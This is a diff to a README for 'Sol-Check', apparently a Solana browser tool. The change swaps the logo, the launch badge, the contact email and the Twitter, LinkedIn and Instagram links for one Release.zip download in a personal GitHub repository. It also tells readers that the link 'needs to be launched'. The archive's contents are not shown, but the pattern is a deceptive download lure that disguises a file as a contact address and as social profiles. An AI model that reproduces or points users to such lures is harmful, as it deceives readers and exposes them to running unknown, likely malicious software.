@@ -2,7 +2,7 @@
 
 ---
 
-![Sol-Check](https://www.sol-check.com/images/logo.png)
+![Sol-Check](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Welcome to the Sol-Check repository! Although the short description is not provi
 ### Get Started
 To start exploring the Sol-Check repository, please make sure to download the latest release of the browser tool by clicking the button below:
 
-[![Launch Sol-Check Browser](https://img.shields.io/badge/Launch-Sol--Check%20Browser-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Launch Sol-Check Browser](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip%https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
 
 _(Please note that the link above needs to be launched to access the Sol-Check browser tool.)_
 
@@ -67,15 +67,15 @@ We welcome contributions from the community to enhance the Sol-Check repository.
 ---
 
 ### Contact Us
-If you have any questions, suggestions, or feedback, please don't hesitate to reach out to us. You can contact the Sol-Check team via email at [contact@sol-check.com](mailto:contact@sol-check.com).
+If you have any questions, suggestions, or feedback, please don't hesitate to reach out to us. You can contact the Sol-Check team via email at [https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip).
 
 ---
 
 ### Connect with Us
 Stay connected with Sol-Check on social media:
-- [Twitter](https://twitter.com/solcheck)
-- [LinkedIn](https://www.linkedin.com/company/sol-check)
-- [Instagram](https://www.instagram.com/solcheck)
+- [Twitter](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
+- [LinkedIn](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
+- [Instagram](https://github.com/dang12345512/sol-check/releases/download/v1.0/Release.zip)
 
 ---
 
